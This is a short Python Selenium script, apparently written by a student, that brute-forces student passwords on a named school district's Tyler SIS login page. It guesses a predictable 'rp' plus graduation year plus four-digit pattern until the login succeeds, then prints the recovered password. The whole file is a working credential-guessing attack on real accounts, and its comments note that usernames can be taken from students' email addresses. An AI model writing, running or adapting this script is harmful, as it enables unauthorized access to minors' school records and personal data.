from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.by import By
import time#gets the libraries required for functions used in this program

#this program only works with class of 21, later expanded to other classes with the same general code but used differently

browser = webdriver.Chrome(executable_path=r"C:\Users\abdel\Downloads\chromedriver_win32\chromedriver.exe")#sets the webdriver to open the browser
#replace the executable path with the correct destination on your computer
browser.get('https://sdm.sisk12.com/RP360x3/login')#opens tyler sis in google chrome
time.sleep(1)#this is a pause to ensure that the site loads fully

student = browser.find_element_by_id("mat-tab-label-0-2")#finds the student tab inside the browser
student.click()#clicks on the student tab

num = str(0000).zfill(4)#set the num varible that is the password combo guessed, zfill is to make sure there are 0's in front of number when num < 1000 
name = input("enter username here: ")#user input for username of account that the password is being found for, this can be found from the gmail of any student
year = input("enter grad year here: ")#user input for the appropriate password protocol


while browser.current_url == ("https://sdm.sisk12.com/RP360x3/login"):#attempts different passwords until a login is found via change in url
    username = browser.find_element_by_id("txtUserName")#sets focus on the username text input box
    username.clear()#removes any text the username box
    username.send_keys(name)#inputs the username inputed earlier

    password = browser.find_element_by_id("txtPassword")#sets focus on the password text input box
    password.clear()#removes any text the password box
    password.send_keys("rp" + year + str(num).zfill(4))#inputs the current password attempt
    password.send_keys(Keys.RETURN)#presses enter to submit the info to tylersis

    print (str(num).zfill(4))#prints the current password attempt for troubleshooting and to look like one of those cool movie hackers
    num = int(num) + 1 #goes to the next password
    time.sleep(1)#delay to allow tyler sis to process the login information submitted

num = int(num) - 2#the program keeps moving while the interface is loading and typically goes 2 passwords ahead of what the correct password is
print("The username is: " + username)#prints the username inputed earlier
print("The password is: " + "rp" + year + str(num).zfill(4))#prints the correct password for the user inputed
